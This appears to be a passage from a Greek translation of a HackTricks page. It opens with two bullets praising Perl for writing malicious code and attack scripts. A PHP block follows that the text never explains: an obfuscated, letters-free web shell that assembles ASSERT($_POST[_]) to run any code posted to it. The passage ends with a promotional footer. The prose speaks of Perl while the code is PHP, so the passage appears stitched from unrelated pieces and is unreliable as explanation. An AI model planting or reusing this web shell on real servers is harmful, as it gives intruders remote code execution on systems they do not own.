- **Επίθεση με χρήση κακόβουλου κώδικα**: Μπορείτε να χρησιμοποιήσετε την Perl για να αναπτύξετε κακόβουλο κώδικα που εκμεταλλεύεται ευπαθείς σημεία σε εφαρμογές και υπηρεσίες, προκαλώντας διάφορες μορφές επιθέσεων όπως απομακρυσμένη εκτέλεση κώδικα, ανεύρεση πληροφοριών και παραβίαση ασφαλείας.

- **Επίθεση με χρήση κακόβουλων σεναρίων**: Μπορείτε να χρησιμοποιήσετε την Perl για να αναπτύξετε κακόβουλους σεναρίους που εκτελούν επιθέσεις αυτοματοποιημένα, εκμεταλλευόμενοι ευπαθείς σημεία σε εφαρμογές και υπηρεσίες.

Η Perl παρέχει ισχυρές δυνατότητες για την ανάπτυξη και εκτέλεση επιθέσεων, καθιστώντας την μια χρήσιμη γλώσσα προγραμματισμού για τους επαγγελματίες του hacking.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
